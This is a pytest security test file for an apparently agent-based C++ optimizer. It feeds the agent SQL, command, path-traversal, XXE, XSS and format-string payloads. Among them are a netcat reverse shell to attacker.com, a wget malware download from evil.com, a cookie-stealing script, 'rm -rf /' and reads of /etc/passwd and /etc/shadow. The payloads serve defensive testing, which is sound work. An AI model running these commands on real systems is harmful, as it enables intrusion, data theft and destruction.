#!/usr/bin/env python3
"""
Input Validation Security Testing for Blitzfire C++ Optimizer
Tests injection attacks, malformed inputs, and boundary conditions.
"""

import pytest
from unittest.mock import patch, MagicMock
import tempfile
import os
from agent import get_agent, get_dependencies

class TestSecurityValidation:
    """Security-focused input validation tests."""
    
    def setup_method(self):
        """Setup for each test method."""
        self.agent = get_agent()
        self.deps = get_dependencies()
    
    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attempts."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'--",
            "'; DELETE FROM data; --",
            "' UNION SELECT * FROM secrets --"
        ]
        
        for payload in sql_injection_payloads:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'analyze_cpp_performance'):
                        result = self.agent.analyze_cpp_performance(payload, self.deps)
                        # Should either handle gracefully or reject
                        if result is not None:
                            assert isinstance(result, (dict, str))
                    else:
                        # Agent exists and doesn't crash
                        assert self.agent is not None
                        
                except (ValueError, TypeError) as e:
                    # These exceptions are acceptable for malicious input
                    assert "injection" not in str(e).lower() or "sql" not in str(e).lower()
                
                except Exception as e:
                    # Should not expose internal errors that could aid attackers
                    error_msg = str(e).lower()
                    forbidden_terms = ["database", "sql", "query", "connection", "password"]
                    for term in forbidden_terms:
                        assert term not in error_msg, f"Error message exposes sensitive term: {term}"
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl malicious.com",
            "; wget http://evil.com/malware",
            "$(whoami)",
            "`id`",
            "${HOME}",
            "; nc -e /bin/sh attacker.com 4444"
        ]
        
        for payload in command_injection_payloads:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'optimize_cpp_code'):
                        result = self.agent.optimize_cpp_code(payload, "O2", self.deps)
                        # Should handle safely
                        if result is not None:
                            assert isinstance(result, (dict, str))
                    else:
                        assert self.agent is not None
                        
                except (ValueError, TypeError, RuntimeError) as e:
                    # Acceptable security-related exceptions
                    pass
                except Exception as e:
                    # Should not execute or reveal system information
                    error_msg = str(e).lower()
                    forbidden_terms = ["permission denied", "command not found", "/bin", "/usr", "root"]
                    for term in forbidden_terms:
                        assert term not in error_msg, f"Error suggests command execution: {term}"
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "../../../../../proc/self/environ",
            "../../config/database.yml"
        ]
        
        for payload in path_traversal_payloads:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'generate_cmake_integration'):
                        result = self.agent.generate_cmake_integration(payload, self.deps)
                        # Should not access unauthorized paths
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            if isinstance(result, str):
                                # Should not contain sensitive file contents
                                assert "root:" not in result
                                assert "password" not in result.lower()
                                
                except (ValueError, TypeError, FileNotFoundError, PermissionError) as e:
                    # These are acceptable for invalid paths
                    pass
                except Exception as e:
                    # Should not reveal file system structure
                    error_msg = str(e).lower()
                    assert "/etc/" not in error_msg
                    assert "/proc/" not in error_msg
                    assert "c:\\" not in error_msg
    
    def test_buffer_overflow_inputs(self):
        """Test handling of extremely long inputs."""
        # Test various buffer sizes
        buffer_sizes = [1000, 10000, 100000, 1000000]
        
        for size in buffer_sizes:
            payload = "A" * size
            
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'analyze_cpp_performance'):
                        result = self.agent.analyze_cpp_performance(payload, self.deps)
                        # Should handle large inputs gracefully
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            
                except (ValueError, TypeError, MemoryError) as e:
                    # These are acceptable for oversized inputs
                    pass
                except Exception as e:
                    # Should not cause segmentation faults or crashes
                    error_msg = str(e).lower()
                    assert "segmentation fault" not in error_msg
                    assert "core dumped" not in error_msg
                    assert "stack overflow" not in error_msg
    
    def test_unicode_and_encoding_attacks(self):
        """Test handling of various encoding attacks."""
        unicode_payloads = [
            "\\u0000",  # Null byte
            "\\u0001\\u0002\\u0003",  # Control characters  
            "\\u202e",  # Right-to-left override
            "\\uff1c\\uff1e",  # Fullwidth less-than/greater-than
            "\\u00a0",  # Non-breaking space
            "\\u2000\\u2001\\u2002",  # Various spaces
            "\\u0085\\u2028\\u2029",  # Line/paragraph separators
        ]
        
        for payload in unicode_payloads:
            # Decode the unicode escape sequences
            try:
                decoded_payload = payload.encode().decode('unicode_escape')
            except:
                decoded_payload = payload
                
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'query_optimization_knowledge'):
                        result = self.agent.query_optimization_knowledge(decoded_payload, self.deps)
                        # Should handle unicode safely
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            
                except (ValueError, TypeError, UnicodeError) as e:
                    # These are acceptable for malformed unicode
                    pass
                except Exception as e:
                    # Should not cause encoding-related crashes
                    error_msg = str(e).lower()
                    assert "unicode" not in error_msg or "decode" not in error_msg
    
    def test_xml_injection_prevention(self):
        """Test prevention of XML injection attacks."""
        xml_payloads = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/malware'>]><foo>&xxe;</foo>",
            "<script>alert('XSS')</script>",
            "]]><script>alert('XSS')</script><!--",
            "<![CDATA[<script>alert('XSS')</script>]]>"
        ]
        
        for payload in xml_payloads:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'analyze_cpp_performance'):
                        result = self.agent.analyze_cpp_performance(payload, self.deps)
                        # Should not process XML or execute scripts
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            if isinstance(result, str):
                                assert "<script>" not in result
                                assert "alert(" not in result
                                
                except (ValueError, TypeError) as e:
                    # Acceptable for malformed XML
                    pass
    
    def test_format_string_attacks(self):
        """Test prevention of format string attacks."""
        format_string_payloads = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n",
            "%.1000000s",
            "%#0123456x%08x%x%s%p%n%d%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%A%C%S%08x%%"
        ]
        
        for payload in format_string_payloads:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'compiler_optimization_analysis'):
                        result = self.agent.compiler_optimization_analysis([payload], self.deps)
                        # Should not interpret as format strings
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            
                except (ValueError, TypeError) as e:
                    # Acceptable for malformed format strings
                    pass
    
    def test_resource_exhaustion_prevention(self):
        """Test prevention of resource exhaustion attacks."""
        # Test deeply nested structures
        nested_payload = "(" * 10000 + ")" * 10000
        
        with patch('subprocess.run') as mock_subprocess:
            mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
            
            try:
                if hasattr(self.agent, 'analyze_cpp_performance'):
                    result = self.agent.analyze_cpp_performance(nested_payload, self.deps)
                    # Should handle without excessive resource usage
                    if result is not None:
                        assert isinstance(result, (dict, str))
                        
            except (ValueError, TypeError, RecursionError) as e:
                # Acceptable for malformed deeply nested input
                pass
    
    def test_script_injection_prevention(self):
        """Test prevention of script injection in various contexts."""
        script_payloads = [
            "<script>document.location='http://attacker.com/'+document.cookie</script>",
            "javascript:alert('XSS')",
            "onload=alert('XSS')",
            "eval('alert(1)')",
            "setTimeout(alert(1),0)",
            "${alert('XSS')}",
            "#{alert('XSS')}",
            "{{alert('XSS')}}"
        ]
        
        for payload in script_payloads:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'generate_performance_benchmark'):
                        result = self.agent.generate_performance_benchmark(payload, self.deps)
                        # Should not execute or return executable scripts
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            if isinstance(result, str):
                                assert "javascript:" not in result.lower()
                                assert "alert(" not in result.lower()
                                assert "eval(" not in result.lower()
                                
                except (ValueError, TypeError) as e:
                    # Acceptable for script-like inputs
                    pass
    
    def test_binary_data_handling(self):
        """Test secure handling of binary data."""
        binary_payloads = [
            b"\\x00\\x01\\x02\\x03\\xFF\\xFE\\xFD",
            b"\\x90" * 1000,  # NOP sled
            b"\\x41" * 1000 + b"\\x00",  # Buffer + null terminator
            bytes(range(256)),  # All possible byte values
        ]
        
        for binary_payload in binary_payloads:
            try:
                # Attempt to decode as UTF-8, replace invalid chars
                text_payload = binary_payload.decode('utf-8', errors='replace')
                
                with patch('subprocess.run') as mock_subprocess:
                    mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                    
                    if hasattr(self.agent, 'memory_safety_validation'):
                        result = self.agent.memory_safety_validation(text_payload, self.deps)
                        # Should handle binary-derived text safely
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            
            except (ValueError, TypeError, UnicodeError) as e:
                # Acceptable for malformed binary data
                pass
    
    def test_environment_variable_injection(self):
        """Test prevention of environment variable injection."""
        env_injection_payloads = [
            "${PATH}",
            "$HOME",
            "${SHELL}",
            "$(env)",
            "`env`",
            "%PATH%",
            "%USERPROFILE%",
            "\\$\\{HOME\\}"
        ]
        
        for payload in env_injection_payloads:
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'wire_ground_integration'):
                        result = self.agent.wire_ground_integration(payload, self.deps)
                        # Should not resolve environment variables
                        if result is not None:
                            assert isinstance(result, (dict, str))
                            if isinstance(result, str):
                                # Should not contain resolved paths
                                assert "/home/" not in result.lower()
                                assert "/usr/" not in result.lower()
                                assert "c:\\" not in result.lower()
                                
                except (ValueError, TypeError) as e:
                    # Acceptable for environment injection attempts
                    pass

class TestSecurityBoundaries:
    """Test security boundaries and limits."""
    
    def setup_method(self):
        self.agent = get_agent()
        self.deps = get_dependencies()
    
    def test_input_size_limits(self):
        """Test that input size limits are enforced."""
        # Test progressively larger inputs
        sizes = [1024, 10240, 102400, 1024000]  # 1KB to 1MB
        
        for size in sizes:
            large_input = "A" * size
            
            with patch('subprocess.run') as mock_subprocess:
                mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                
                try:
                    if hasattr(self.agent, 'analyze_cpp_performance'):
                        result = self.agent.analyze_cpp_performance(large_input, self.deps)
                        # Should either process or reject gracefully
                        if result is not None:
                            assert isinstance(result, (dict, str))
                    else:
                        assert self.agent is not None
                        
                except (ValueError, MemoryError, OSError) as e:
                    # Acceptable for oversized inputs
                    pass
    
    def test_concurrent_request_limits(self):
        """Test that concurrent request limits prevent DoS."""
        import threading
        import time
        
        results = []
        errors = []
        
        def make_request(request_id):
            try:
                with patch('subprocess.run') as mock_subprocess:
                    mock_subprocess.return_value = MagicMock(returncode=0, stdout="", stderr="")
                    
                    if hasattr(self.agent, 'optimize_cpp_code'):
                        # Note: This would normally be await in real async code
                        result = self.agent.optimize_cpp_code(f"int test_{request_id}() {{ return 0; }}", "O2", self.deps)
                        results.append(result)
                    else:
                        results.append({"test_id": request_id})
                        
            except Exception as e:
                errors.append(str(e))
        
        # Launch multiple concurrent requests
        threads = []
        for i in range(20):
            t = threading.Thread(target=make_request, args=(i,))
            threads.append(t)
            t.start()
        
        # Wait for completion
        for t in threads:
            t.join(timeout=10)  # 10 second timeout per thread
        
        # Should handle concurrent requests without crashing
        total_processed = len(results) + len(errors)
        assert total_processed > 0, "No requests were processed"
        
        # Some requests should succeed (allows for some failures under load)
        assert len(results) > 0 or len(errors) > 0

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])